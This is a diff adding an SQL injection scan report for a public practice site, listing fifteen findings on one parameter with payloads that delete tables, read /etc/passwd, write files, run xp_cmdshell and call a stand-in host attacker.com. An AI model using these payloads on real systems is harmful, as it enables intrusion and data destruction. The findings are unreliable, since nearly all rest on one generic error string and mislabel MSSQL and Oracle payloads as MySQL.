@@ -1,0 +1,204 @@
+======================================================================
+SQL Injection Scan Report
+======================================================================
+
+Target URL: http://testphp.vulnweb.com/artists.php?artist=1
+Scan Date: 2026-01-21 12:24:06
+
+----------------------------------------------------------------------
+SCAN STATISTICS
+----------------------------------------------------------------------
+Total Payloads Tested: 84
+Total Vulnerabilities: 15
+Unique Vulnerable Params: 1
+Scan Duration: 2.80 seconds
+Request Rate: 29.97 req/sec
+
+----------------------------------------------------------------------
+VULNERABILITY SUMMARY
+----------------------------------------------------------------------
+
+By Severity:
+  Critical (90-100% confidence): 1
+  High (70-89% confidence):      14
+  Medium (50-69% confidence):    0
+  Low (<50% confidence):         0
+
+By Database Type:
+  mysql: 15
+
+By Injection Type:
+  error_based: 15
+
+----------------------------------------------------------------------
+DETAILED FINDINGS
+----------------------------------------------------------------------
+
+[1] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DELETE FROM users--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.084s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[2] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR username LIKE '%
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[3] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR 1=1; EXEC xp_cmdshell('dir')--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.084s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[4] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+    Type: error_based
+    Database: mysql
+    Confidence: 90%
+    Response Code: 200
+    Response Time: 0.087s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[5] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[6] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND (SELECT SUBSTRING(username,1,1) FROM users)='a'--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[7] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT LOAD_FILE('/etc/passwd')--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[8] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' INTO OUTFILE '/tmp/test.txt'--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.087s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[9] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' INTO DUMPFILE '/tmp/test.txt'--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[10] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ||UTL_HTTP.REQUEST('http://attacker.com/')||
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[11] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR UTL_HTTP.REQUEST('http://attacker.com/')--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.086s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[12] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DECLARE @q NVARCHAR(4000);SET @q='';EXEC(@q)--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.088s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[13] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC sp_executesql N'SELECT 1'--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.083s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[14] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; EXEC('sel'+'ect @@version')--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 0.088s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+[15] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,column_name FROM information_schema.columns--
+    Type: error_based
+    Database: mysql
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 1.092s
+    Evidence: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+
+======================================================================
+END OF REPORT
+======================================================================
